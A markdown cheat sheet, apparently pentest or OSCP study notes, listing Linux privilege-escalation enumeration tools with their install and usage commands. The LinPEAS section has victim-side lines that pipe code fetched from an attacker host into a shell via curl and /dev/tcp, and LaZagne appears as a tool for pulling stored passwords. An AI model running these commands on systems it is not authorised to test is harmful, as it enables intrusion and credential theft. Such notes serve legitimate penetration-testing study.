# `Linux Priv Esc Bible` | http://pentestmonkey.net/tools/audit/unix-privesc-check

[Linux PrivEsc Content](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

[Pentest Monkey - Unix PrivEsc Check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

***
## If wget doesn't work :

```bash
cat > les.sh
This file was created using cat (^._.^)
# Hit Ctrl+D to exit!
```
***

# Linux Exploit Suggester | https://github.com/mzet-/linux-exploit-suggester
```bash
# install
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

# usage
./les.sh
```

# Linux Smart Enumeration | https://github.com/diego-treitos/linux-smart-enumeration

```bash
# install
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh

# usage
# shows interesting information that should help you to privesc
./lse.sh -l1 
# dump all the information it gathers about the system
./lse.sh -l2 
```

# Linpeas | https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

```bash
# install
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh

# COMMANDS
# Local network
# On the Host
sudo python -m SimpleHTTPServer 80 

# On the Victim
curl $ip/linpeas.sh | sh 

# Without curl
# On the Host
sudo nc -q 5 -lvnp 80 < linpeas.sh 

# On the Victim
cat < /dev/tcp/10.10.10.10/80 | sh 

# USAGE
#all checks - deeper system enumeration, but it takes longer to complete.
./linpeas.sh -a 
# superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
./linpeas.sh -s
 #Password - Pass a password that will be used with sudo -l and bruteforcing other users
./linpeas.sh -P
```

# Linux Priv Checker | https://github.com/sleventyeleven/linuxprivchecker
```bash
# INSTALL
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py

# python 2.6/2.7
python linuxprivchecker.py -w -o linuxprivchecker.log

# python 3.x
pip install linuxprivchecker

# USAGE
linuxprivchecker -w -o linuxprivchecker.log
# or 
python3 -m linuxprivchecker -w -o linuxprivchecker.log
```

# LinEnum | https://github.com/rebootuser/LinEnum
```bash
# install
git clone https://github.com/rebootuser/LinEnum.git

# usage
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```
# LaZagne | https://github.com/AlessandroZ/LaZagne
>Retrieve lots of passwords stored on a local computer.

```bash
# install
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
pip install -r requirements.txt
cd Linux/

# usage
python laZagne.py
```

# Unix PrivEsc Check | https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz

```bash
chmod +x unix-privesc-check
./unix-privesc-check > checks.txt
```

# Pwncat-cs | https://github.com/calebstewart/pwncat
## Usage
```bash
# enumeration
run enumerate # to enumerate the whole server
run enumerate.file.caps # to enumerate linux capabilities
run enumerate.file.suid # to enumerate suid files
```

![image](https://github.com/buger-shack/scriptkiddie/assets/61053314/c28b3cf6-66ed-46e2-bb64-7c8455e35e82)
